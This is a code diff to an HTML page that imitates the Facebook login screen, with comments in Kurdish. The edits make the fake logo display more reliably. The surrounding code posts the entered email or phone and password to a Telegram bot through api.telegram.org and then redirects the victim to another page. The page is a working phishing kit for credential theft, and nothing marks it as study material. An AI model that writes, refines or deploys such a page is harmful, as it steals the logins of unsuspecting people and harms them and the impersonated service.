@@ -35,9 +35,11 @@
             padding: 0 15px;
             box-sizing: border-box;
         }
+        /* لێرە ستایلی لۆگۆکەم ڕێکخستووەتەوە */
         .fb-logo {
             width: 112px;
             margin-bottom: 20px;
+            height: auto;
         }
         .form-container {
             background: white;
@@ -106,7 +108,8 @@
     </div>
 
     <div class="login-box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lB9f1af9q9.svg" alt="Facebook" class="fb-logo">
+        <!-- بەکارهێنانی لینکی وێنەی PNG لە بری SVG بۆ دڵنیایی زیاتر لە دەرکەوتنی -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/512px-2021_Facebook_icon.svg.png" alt="Facebook" class="fb-logo">
         
         <div class="form-container">
             <input type="text" id="user" placeholder="Email address or phone number" dir="ltr">
@@ -139,7 +142,6 @@
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
             .then(() => {
-                // دڵنیابە ناوی فایلەکەت Otm.html بێت لە گێت هەب
                 window.location.href = "Otm.html";
             })
             .catch(() => {
